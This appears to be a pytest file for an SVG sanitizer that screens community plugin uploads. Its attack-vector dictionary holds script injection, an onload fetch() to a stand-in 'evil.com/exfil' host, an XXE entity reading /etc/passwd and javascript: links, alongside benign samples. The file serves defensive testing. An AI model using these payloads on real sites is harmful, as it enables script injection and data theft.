"""SVG security test vectors for community plugin submission validation.

Exercises the real sanitizer (``app.security.svg.sanitize_svg``). Previously
this file referenced a non-existent ``sanitize_fn`` fixture (no conftest.py)
so the vectors never actually ran; it is now parametrized and wired into CI.
"""

from __future__ import annotations

import pytest

from app.security.svg import sanitize_svg

# ── Known SVG attack vectors ─────────────────────────────────────────
# Each entry must be rejected with ValueError by sanitize_svg.

SVG_ATTACK_VECTORS: dict[str, str] = {
    # Script injection
    "script_tag": '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',

    # Event handler
    "onload_handler": '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://evil.com/exfil\')">'
    '<rect width="100" height="100"/></svg>',
    "onclick_handler": '<svg><rect onclick="fetch(\'/api/keys\')" width="100" height="100"/></svg>',

    # External entity
    "dtd_entity": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<svg>&xxe;</svg>',

    # Foreign object
    "foreign_object": '<svg xmlns="http://www.w3.org/2000/svg">'
    '<foreignObject><iframe src="https://evil.com"></iframe></foreignObject></svg>',

    # External reference (href)
    "external_ref_href": '<svg xmlns="http://www.w3.org/2000/svg">'
    '<image href="https://evil.com/exfil.png" width="100" height="100"/></svg>',

    # External reference (xlink:href)
    "external_ref_xlink": '<svg xmlns="http://www.w3.org/2000/svg">'
    '<use xlink:href="https://evil.com/evil.svg#payload"/>',

    # Additional hardening cases
    "data_uri_href": '<svg xmlns="http://www.w3.org/2000/svg">'
    '<image href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="/></svg>',
    "javascript_href": '<svg xmlns="http://www.w3.org/2000/svg">'
    '<a href="javascript:alert(1)"><text>click</text></a></svg>',
    "uppercase_onload": '<svg xmlns="http://www.w3.org/2000/svg" ONLOAD="alert(1)"></svg>',
    "protocol_relative_href": '<svg xmlns="http://www.w3.org/2000/svg">'
    '<image href="//evil.com/exfil.png"/></svg>',
}

# ── Benign SVGs ──────────────────────────────────────────────────────
# Each must pass through sanitize_svg unchanged (no ValueError).

BENIGN_SVGS: list[str] = [
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">'
    '<rect width="100" height="100" fill="#fff"/></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<defs><linearGradient id="g"><stop offset="0" stop-color="#000"/></linearGradient></defs>'
    '<circle cx="50" cy="50" r="40" fill="url(#g)"/></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg"><use href="#icon"/><path d="M0 0 L10 10"/></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<g transform="translate(10,10)"><text font-size="12">hello</text></g></svg>',
]


@pytest.mark.parametrize("vector_name", sorted(SVG_ATTACK_VECTORS))
def test_svg_attack_vectors_rejected(vector_name: str) -> None:
    """Every known attack vector must raise ValueError."""
    payload = SVG_ATTACK_VECTORS[vector_name]
    with pytest.raises(ValueError):
        sanitize_svg(payload)


@pytest.mark.parametrize("benign", BENIGN_SVGS)
def test_benign_svg_passthrough(benign: str) -> None:
    """Benign SVGs (including internal fragment hrefs) pass through unchanged."""
    assert sanitize_svg(benign) == benign


def test_empty_svg_rejected() -> None:
    """Empty/whitespace-only input is rejected."""
    with pytest.raises(ValueError):
        sanitize_svg("   ")
    with pytest.raises(ValueError):
        sanitize_svg("")
